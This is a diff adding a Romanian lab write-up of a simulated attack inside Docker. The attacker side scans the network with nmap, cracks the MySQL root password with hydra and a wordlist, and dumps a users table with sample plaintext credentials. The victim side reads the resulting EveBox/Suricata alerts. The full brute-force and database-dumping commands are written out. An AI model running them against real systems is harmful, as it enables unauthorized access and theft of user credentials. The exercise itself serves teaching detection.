@@ -1,0 +1,38 @@
+Atacator:
+
+-----------------------------------------------------------
+
+Ca atacator, intru în containerul de Kali Linux cu comanda "docker exec -it kali_attacker bash".
+
+Rulez comanda "ip a" pentru a vedea ce adresă IP am. În cazul meu: 172.18.0.2/16.
+
+Presupun că rețeaua este 172.18.0.0 și rulez comanda "nmap -sn 172.18.0.0/24". În outputul comenzii găsesc linia "Nmap scan report for mysql_db.net1 (172.18.0.3)".
+
+Folosind informațiile găsite cu comanda anterioară, rulez "nmap -sC -sV 172.18.0.3" pentru a vedea ce porturi deschise are adresa 172.18.0.3, care pare să fie adresa unei baze de date mysql. Observ că acea adresă are portul 3306 deschis. [1]
+
+Presupun că numele de utilizator al bazei de date este root și rulez comanda "hydra -l root -P /usr/share/wordlists/rockyou.txt 172.18.0.3 mysql -t 4" pentru a încerca să sparg parola acesteia (mysql trebuie să fie instalat și în Kali - ar trebui să fie deja). Am găsit parola bazei de date: admin123 în 27 de minute (prima încercare a durat 10 minute). [2]
+
+Acum că știu parola, mă conectez la mysql și caut bazele de date existente cu comanda 'mysql -h 172.18.0.3 -u root -padmin123 --ssl=FALSE -e "SHOW DATABASES;"'. Găsesc baza de date cu numele "simulator_db". [3]
+
+Rulez comanda: 'mysql -h 172.18.0.3 -u root -padmin123 --ssl=FALSE -e "USE simulator_db; SHOW TABLES;"' pentru a vedea ce tabele are baza de date. Găsesc tabela "users" în simulator_db. [4]
+
+Rulez comanda: 'mysql -h 172.18.0.3 -u root -padmin123 --ssl=FALSE -e "USE simulator_db; SELECT * FROM users;"' pentru a vedea conținutul tabelei "users". Găsesc trei utilizatori cu parolele și adresele de email ale fiecăruia. [5]
+	admin		password123	admin@company.com  
+	john_doe	p@ssword!	john@company.com   
+	secret_user	supersecure456	secret@company.com
+
+-----------------------------------------------------------
+
+Victimă:
+
+-----------------------------------------------------------
+
+Ca victimă, accesez EveBox la adresa https://localhost:5636 pentru a citi logurile mai ușor.
+
+În tabul de Events, observ o serie de loguri de tip "ANOMALY", "FILEINFO" și "HTTP" care au ca sursă adresa 172.18.0.2 și ca destinație 172.18.0.3 (adresa bazei mele de date). Observ un request suspicios asociat cu comanda nmap: GET /nice%20ports%2C/Tri%6Eity.txt%2ebak. [1]
+
+Observ foarte multe loguri de tip "FLOW" cu sursa 172.18.0.2 și destinația 172.18.03. [2]
+
+Observ câteva loguri intermediare de tip "FLOW" cu sursa 172.18.0.2 și destinația 172.18.03. [3], [4], [5].
+
+-----------------------------------------------------------
